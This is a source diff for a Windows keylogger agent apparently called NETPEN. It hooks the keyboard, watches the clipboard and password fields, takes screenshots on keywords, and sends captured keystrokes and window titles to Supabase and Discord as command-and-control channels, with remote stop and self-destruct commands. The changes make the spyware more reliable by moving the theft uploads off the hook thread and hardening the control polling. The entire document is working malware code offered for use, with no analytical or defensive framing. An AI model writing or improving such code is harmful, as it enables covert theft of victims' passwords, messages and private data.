@@ -62,6 +62,8 @@ static DWORD g_lastAutoScreenshot = 0;      // throttle for trigger-based screen
 static std::vector<std::string> g_triggers;   // keyword list from Supabase screenshot_triggers
 static std::string g_pendingAutoTitle;        // queued window title for auto-SS (processed on timer)
 static std::string g_pendingAutoKw;           // matched keyword for the pending auto-SS
+static std::string g_pendingFlushWin;         // title for keys queued off the keyboard hook
+static std::string g_pendingFlushKeys;        // keys to flush on timer (never network from hook)
 static bool g_running = true;                 // false stops the message loop and lets child exit
 static bool g_selfDestructing = false;        // latched true while self-destruct is in progress
 static std::string g_hostname;                // local computer name, used as agent key everywhere
@@ -335,7 +337,7 @@ static void LogMsg(const std::string& msg) {
 // Generic Supabase REST request. Uses anon key (g_supabaseKey) for both
 // apikey + Authorization headers. 5s timeouts on every phase. Caller is
 // responsible for closing nothing — all HINTERNET handles are cleaned up here.
-// Returns true on HTTP success (any status code), with the body in `response`.
+// Returns true only for HTTP 2xx, with the body in `response`.
 static bool HttpRequest(const wchar_t* method, const wchar_t* path, const std::string& body, std::string& response) {
     HINTERNET hSession = WinHttpOpen(AGENT_UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) return false;
@@ -375,6 +377,11 @@ static bool HttpRequest(const wchar_t* method, const wchar_t* path, const std::s
         return false;
     }
 
+    DWORD status = 0;
+    DWORD statusSize = sizeof(status);
+    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+        WINHTTP_HEADER_NAME_BY_INDEX, &status, &statusSize, WINHTTP_NO_HEADER_INDEX);
+
     std::string result;
     DWORD size = 0;
     while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
@@ -391,7 +398,7 @@ static bool HttpRequest(const wchar_t* method, const wchar_t* path, const std::s
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
-    return true;
+    return status >= 200 && status < 300;
 }
 
 // POST a single keystrokes JSON row to Supabase.
@@ -518,21 +525,24 @@ static void PostToDiscord(const std::string& hostname, const std::string& window
 
 // Poll Supabase control table for a pending "stop" command for this hostname.
 // Marks it executed if found so it only fires once.
+// Requires a real numeric id — error JSON / non-array bodies are ignored.
 static bool CheckStop() {
     std::wstring query = SUPABASE_CONTROL_PATH;
     query += L"?command=eq.stop&executed=eq.false&hostname=eq.";
     query += HostFilterEq();
-    query += L"&select=id";
+    query += L"&select=id&limit=1";
     std::string response;
     if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
-    if (response.empty() || response == "[]") return false;
+    if (response.empty() || response == "[]" || response[0] != '[') return false;
     std::string rowId = ExtractJSONNumber(response, "id");
-    if (!rowId.empty()) {
-        std::string patch = "{\"executed\":true}";
-        std::wstring patchPath = SUPABASE_CONTROL_PATH;
-        patchPath += L"?id=eq." + ToWide(rowId);
-        HttpRequest(L"PATCH", patchPath.c_str(), patch, response);
+    if (rowId.empty()) return false;
+    for (size_t i = 0; i < rowId.size(); i++) {
+        if (rowId[i] < '0' || rowId[i] > '9') return false;
     }
+    std::string patch = "{\"executed\":true}";
+    std::wstring patchPath = SUPABASE_CONTROL_PATH;
+    patchPath += L"?id=eq." + ToWide(rowId);
+    HttpRequest(L"PATCH", patchPath.c_str(), patch, response);
     return true;
 }
 
@@ -612,21 +622,24 @@ static void ScheduleSelfDestruct() {
 }
 
 // Poll Supabase control table for a pending "selfdestruct" command.
+// Requires a real numeric id — error JSON / non-array bodies are ignored.
 static bool CheckSelfDestruct() {
     std::wstring query = SUPABASE_CONTROL_PATH;
     query += L"?command=eq.selfdestruct&executed=eq.false&hostname=eq.";
     query += HostFilterEq();
-    query += L"&select=id";
+    query += L"&select=id&limit=1";
     std::string response;
     if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
-    if (response.empty() || response == "[]") return false;
+    if (response.empty() || response == "[]" || response[0] != '[') return false;
     std::string rowId = ExtractJSONNumber(response, "id");
-    if (!rowId.empty()) {
-        std::string patch = "{\"executed\":true}";
-        std::wstring patchPath = SUPABASE_CONTROL_PATH;
-        patchPath += L"?id=eq." + ToWide(rowId);
-        HttpRequest(L"PATCH", patchPath.c_str(), patch, response);
+    if (rowId.empty()) return false;
+    for (size_t i = 0; i < rowId.size(); i++) {
+        if (rowId[i] < '0' || rowId[i] > '9') return false;
     }
+    std::string patch = "{\"executed\":true}";
+    std::wstring patchPath = SUPABASE_CONTROL_PATH;
+    patchPath += L"?id=eq." + ToWide(rowId);
+    HttpRequest(L"PATCH", patchPath.c_str(), patch, response);
     return true;
 }
 
@@ -1573,17 +1586,9 @@ static void CheckClipboard() {
     PostToDiscord(g_hostname, "[CLIPBOARD]", discordText);
 }
 
-// Flush the accumulated keystroke buffer to Supabase and Discord.
-// Sends the keys, clears g_keys. If PostKeys fails, re-queues the keys
-// (capped at 10KB) to avoid data loss. Called from KeyboardProc (on window
-// title change) and from the timer (every 5s when idle for 300ms).
-static void FlushBuffer() {
-    if (g_keys.empty()) return;
-
-    std::string win = g_winTitle;
-    std::string keys = g_keys;
-    g_keys.clear();
-
+// POST win/keys to Discord + Supabase. Re-queues into g_keys on PostKeys failure.
+static void FlushKeysToC2(const std::string& win, const std::string& keys) {
+    if (keys.empty()) return;
     std::string json = "[{\"window_title\":\"";
     json += EscapeJSON(win);
     json += "\",\"keys\":\"";
@@ -1591,7 +1596,6 @@ static void FlushBuffer() {
     json += "\",\"hostname\":\"";
     json += EscapeJSON(g_hostname);
     json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
-
     PostToDiscord(g_hostname, win, keys);
     if (!PostKeys(json)) {
         g_keys = keys + g_keys;
@@ -1600,12 +1604,29 @@ static void FlushBuffer() {
     }
 }
 
+// Flush title-change keys queued by the hook (timer thread only — never from hook).
+static void ProcessPendingKeyFlush() {
+    if (g_pendingFlushKeys.empty()) return;
+    std::string win = g_pendingFlushWin;
+    std::string keys = g_pendingFlushKeys;
+    g_pendingFlushWin.clear();
+    g_pendingFlushKeys.clear();
+    FlushKeysToC2(win, keys);
+}
+
+// Flush the live keystroke buffer (current window). Timer / idle path only.
+static void FlushBuffer() {
+    if (g_keys.empty()) return;
+    std::string win = g_winTitle;
+    std::string keys = g_keys;
+    g_keys.clear();
+    FlushKeysToC2(win, keys);
+}
+
 // === Low-level keyboard hook ===================================================
-// Installed via SetWindowsHookEx(WH_KEYBOARD_LL). Runs on the same thread as
-// the message loop (system injects the hook DLL into our process). Accumulates
-// keystrokes in g_keys and flushes on window-title change. The old inline
-// FlushBuffer() on buffer overflow was removed to avoid blocking the hook.
-// See FlushBuffer() and the timer for flush logic.
+// Installed via SetWindowsHookEx(WH_KEYBOARD_LL). Must stay fast: only buffer
+// keys, track window title, and queue work. Never call WinHTTP here.
+// Flushes and auto-SS capture run on the timer thread.
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
@@ -1614,22 +1635,21 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         std::string newTitle = GetWindowTitle();
         DWORD now = GetTickCount();
 
-        if (newTitle != g_winTitle && !g_keys.empty()) {
-            std::string win = g_winTitle;
-            std::string keys = g_keys;
-            g_keys.clear();
+        if (newTitle != g_winTitle) {
+            if (!g_keys.empty()) {
+                // Queue flush for old title — network happens on timer, not here
+                if (g_pendingFlushKeys.empty()) {
+                    g_pendingFlushWin = g_winTitle;
+                    g_pendingFlushKeys = g_keys;
+                } else {
+                    g_pendingFlushKeys += g_keys;
+                    if (g_pendingFlushKeys.size() > 10000)
+                        g_pendingFlushKeys = g_pendingFlushKeys.substr(0, 10000);
+                }
+                g_keys.clear();
+            }
             g_winTitle = newTitle;
             g_lastTick = now;
-
-            std::string json = "[{\"window_title\":\"";
-            json += EscapeJSON(win);
-            json += "\",\"keys\":\"";
-            json += EscapeJSON(keys);
-            json += "\",\"hostname\":\"";
-            json += EscapeJSON(g_hostname);
-            json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
-            PostToDiscord(g_hostname, win, keys);
-            PostKeys(json);
             CheckAutoScreenshot(newTitle);
         } else if (g_winTitle.empty()) {
             g_winTitle = newTitle;
@@ -1741,7 +1761,10 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         {
             static int counter = 0;
             counter++;
-            if (!g_selfDestructing) ProcessPendingAutoScreenshot();
+            if (!g_selfDestructing) {
+                ProcessPendingKeyFlush();
+                ProcessPendingAutoScreenshot();
+            }
             if (counter % 3 == 0 && !g_selfDestructing) CheckClipboard();
             if (counter % 2 == 0 && !g_selfDestructing) CheckPasswordFields();
             if (counter % 5 == 0 && !g_keys.empty()) {
